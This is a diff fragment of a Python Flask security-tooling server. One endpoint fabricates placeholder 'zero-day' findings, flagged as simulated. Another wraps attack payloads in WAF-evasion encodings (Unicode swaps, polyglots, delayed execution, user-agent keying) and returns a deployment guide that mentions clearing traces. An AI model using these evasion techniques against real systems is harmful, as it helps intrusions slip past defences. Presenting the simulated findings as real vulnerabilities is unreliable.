+        logger.info(f"🔬 Starting zero-day research for {target_software} | Depth: {analysis_depth}")
+        
+        research_results = {
+            "target_software": target_software,
+            "analysis_depth": analysis_depth,
+            "research_areas": [],
+            "potential_vulnerabilities": [],
+            "risk_assessment": {},
+            "recommendations": []
+        }
+        
+        # Define research areas based on software type
+        common_research_areas = [
+            "Input validation vulnerabilities",
+            "Memory corruption issues",
+            "Authentication bypasses",
+            "Authorization flaws",
+            "Cryptographic weaknesses",
+            "Race conditions",
+            "Logic flaws"
+        ]
+        
+        # Software-specific research areas
+        web_research_areas = [
+            "Cross-site scripting (XSS)",
+            "SQL injection",
+            "Server-side request forgery (SSRF)",
+            "Insecure deserialization",
+            "Template injection"
+        ]
+        
+        system_research_areas = [
+            "Buffer overflows",
+            "Privilege escalation",
+            "Kernel vulnerabilities",
+            "Service exploitation",
+            "Configuration weaknesses"
+        ]
+        
+        # Determine research areas based on target
+        target_lower = target_software.lower()
+        if any(web_tech in target_lower for web_tech in ["apache", "nginx", "tomcat", "php", "node", "django"]):
+            research_results["research_areas"] = common_research_areas + web_research_areas
+        elif any(sys_tech in target_lower for sys_tech in ["windows", "linux", "kernel", "driver"]):
+            research_results["research_areas"] = common_research_areas + system_research_areas
+        else:
+            research_results["research_areas"] = common_research_areas
+        
+        # Simulate vulnerability discovery based on analysis depth
+        vuln_count = {"quick": 2, "standard": 4, "comprehensive": 6}.get(analysis_depth, 4)
+        
+        for i in range(vuln_count):
+            potential_vuln = {
+                "id": f"RESEARCH-{target_software.upper()}-{i+1:03d}",
+                "category": research_results["research_areas"][i % len(research_results["research_areas"])],
+                "severity": ["LOW", "MEDIUM", "HIGH", "CRITICAL"][i % 4],
+                "confidence": ["LOW", "MEDIUM", "HIGH"][i % 3],
+                "description": f"Potential {research_results['research_areas'][i % len(research_results['research_areas'])].lower()} in {target_software}",
+                "attack_vector": "To be determined through further analysis",
+                "impact": "To be assessed",
+                "proof_of_concept": "Research phase - PoC development needed"
+            }
+            research_results["potential_vulnerabilities"].append(potential_vuln)
+        
+        # Risk assessment
+        high_risk_count = sum(1 for v in research_results["potential_vulnerabilities"] if v["severity"] in ["HIGH", "CRITICAL"])
+        total_vulns = len(research_results["potential_vulnerabilities"])
+        
+        research_results["risk_assessment"] = {
+            "total_areas_analyzed": len(research_results["research_areas"]),
+            "potential_vulnerabilities_found": total_vulns,
+            "high_risk_findings": high_risk_count,
+            "risk_score": min((high_risk_count * 25 + (total_vulns - high_risk_count) * 10), 100),
+            "research_confidence": analysis_depth
+        }
+        
+        # Generate recommendations
+        if high_risk_count > 0:
+            research_results["recommendations"] = [
+                "Prioritize security testing in identified high-risk areas",
+                "Conduct focused penetration testing",
+                "Implement additional security controls",
+                "Consider bug bounty program for target software",
+                "Perform code review in identified areas"
+            ]
+        else:
+            research_results["recommendations"] = [
+                "Continue standard security testing",
+                "Monitor for new vulnerability research",
+                "Implement defense-in-depth strategies",
+                "Regular security assessments recommended"
+            ]
+        
+        # Source code analysis simulation
+        if source_code_url:
+            research_results["source_code_analysis"] = {
+                "repository_url": source_code_url,
+                "analysis_status": "simulated",
+                "findings": [
+                    "Static analysis patterns identified",
+                    "Potential code quality issues detected",
+                    "Security-relevant functions located"
+                ],
+                "recommendation": "Manual code review recommended for identified areas"
+            }
+        
+        result = {
+            "success": True,
+            "zero_day_research": research_results,
+            "disclaimer": "This is simulated research for demonstration. Real zero-day research requires extensive manual analysis.",
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"🎯 Zero-day research completed | Risk Score: {research_results['risk_assessment']['risk_score']}")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in zero-day research: {str(e)}")
+        return jsonify({
+            "success": False,
+            "error": f"Server error: {str(e)}"
+        }), 500
+
+@app.route("/api/ai/advanced-payload-generation", methods=["POST"])
+def advanced_payload_generation():
+    """Generate advanced payloads with AI-powered evasion techniques"""
+    try:
+        params = request.json
+        attack_type = params.get("attack_type", "rce")
+        target_context = params.get("target_context", "")
+        evasion_level = params.get("evasion_level", "standard")
+        custom_constraints = params.get("custom_constraints", "")
+        
+        if not attack_type:
+            logger.warning("🎯 Advanced payload generation called without attack type")
+            return jsonify({
+                "success": False,
+                "error": "Attack type parameter is required"
+            }), 400
+        
+        logger.info(f"🎯 Generating advanced {attack_type} payload with {evasion_level} evasion")
+        
+        # Enhanced payload generation with contextual AI
+        target_info = {
+            "attack_type": attack_type,
+            "complexity": "advanced",
+            "technology": target_context,
+            "evasion_level": evasion_level,
+            "constraints": custom_constraints
+        }
+        
+        # Generate base payloads using existing AI system
+        base_result = ai_payload_generator.generate_contextual_payload(target_info)
+        
+        # Enhance with advanced techniques
+        advanced_payloads = []
+        
+        for payload_info in base_result.get("payloads", [])[:10]:  # Limit to 10 advanced payloads
+            enhanced_payload = {
+                "payload": payload_info["payload"],
+                "original_context": payload_info["context"],
+                "risk_level": payload_info["risk_level"],
+                "evasion_techniques": [],
+                "deployment_methods": []
+            }
+            
+            # Apply evasion techniques based on level
+            if evasion_level in ["advanced", "nation-state"]:
+                # Advanced encoding techniques
+                encoded_variants = [
+                    {
+                        "technique": "Double URL Encoding",
+                        "payload": payload_info["payload"].replace("%", "%25").replace(" ", "%2520")
+                    },
+                    {
+                        "technique": "Unicode Normalization",
+                        "payload": payload_info["payload"].replace("script", "scr\u0131pt")
+                    },
+                    {
+                        "technique": "Case Variation",
+                        "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload_info["payload"]))
+                    }
+                ]
+                enhanced_payload["evasion_techniques"].extend(encoded_variants)
+            
+            if evasion_level == "nation-state":
+                # Nation-state level techniques
+                advanced_techniques = [
+                    {
+                        "technique": "Polyglot Payload",
+                        "payload": f"/*{payload_info['payload']}*/ OR {payload_info['payload']}"
+                    },
+                    {
+                        "technique": "Time-delayed Execution",
+                        "payload": f"setTimeout(function(){{{payload_info['payload']}}}, 1000)"
+                    },
+                    {
+                        "technique": "Environmental Keying",
+                        "payload": f"if(navigator.userAgent.includes('specific')){{ {payload_info['payload']} }}"
+                    }
+                ]
+                enhanced_payload["evasion_techniques"].extend(advanced_techniques)
+            
+            # Deployment methods
+            enhanced_payload["deployment_methods"] = [
+                "Direct injection",
+                "Parameter pollution",
+                "Header injection",
+                "Cookie manipulation",
+                "Fragment-based delivery"
+            ]
+            
+            advanced_payloads.append(enhanced_payload)
+        
+        # Generate deployment instructions
+        deployment_guide = {
+            "pre_deployment": [
+                "Reconnaissance of target environment",
+                "Identification of input validation mechanisms",
+                "Analysis of security controls (WAF, IDS, etc.)",
+                "Selection of appropriate evasion techniques"
+            ],
+            "deployment": [
+                "Start with least detectable payloads",
+                "Monitor for defensive responses",
+                "Escalate evasion techniques as needed",
+                "Document successful techniques for future use"
+            ],
+            "post_deployment": [
+                "Monitor for payload execution",
+                "Clean up traces if necessary",
+                "Document findings",
+                "Report vulnerabilities responsibly"
+            ]
+        }
+        
+        result = {
+            "success": True,
+            "advanced_payload_generation": {
+                "attack_type": attack_type,
+                "evasion_level": evasion_level,
+                "target_context": target_context,
+                "payload_count": len(advanced_payloads),
+                "advanced_payloads": advanced_payloads,
+                "deployment_guide": deployment_guide,
+                "custom_constraints_applied": custom_constraints if custom_constraints else "none"
+            },
+            "disclaimer": "These payloads are for authorized security testing only. Ensure proper authorization before use.",
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        logger.info(f"🎯 Advanced payload generation completed | Generated: {len(advanced_payloads)} payloads")
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"💥 Error in advanced payload generation: {str(e)}")
+        return jsonify({
+            "success": False,
             "error": f"Server error: {str(e)}"
         }), 500
 
